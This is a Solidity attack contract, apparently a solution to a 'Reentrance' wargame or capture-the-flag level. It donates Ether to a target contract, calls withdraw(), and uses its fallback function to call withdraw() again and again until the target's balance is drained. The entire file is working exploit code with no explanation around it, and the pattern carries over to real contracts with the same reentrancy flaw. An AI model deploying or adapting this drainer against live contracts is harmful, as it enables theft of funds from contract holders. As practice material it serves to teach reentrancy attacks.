// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";
import "hardhat/console.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        Reentrance reentrance = Reentrance(contractAddress);
        reentrance.donate{value: address(this).balance}(address(this));
        reentrance.withdraw();
    }

    // The Reentrance contract will call this function on withdraw
    fallback() external payable {
        if (contractAddress.balance >= 1 ) {
            Reentrance(contractAddress).withdraw();
        }
    }
}
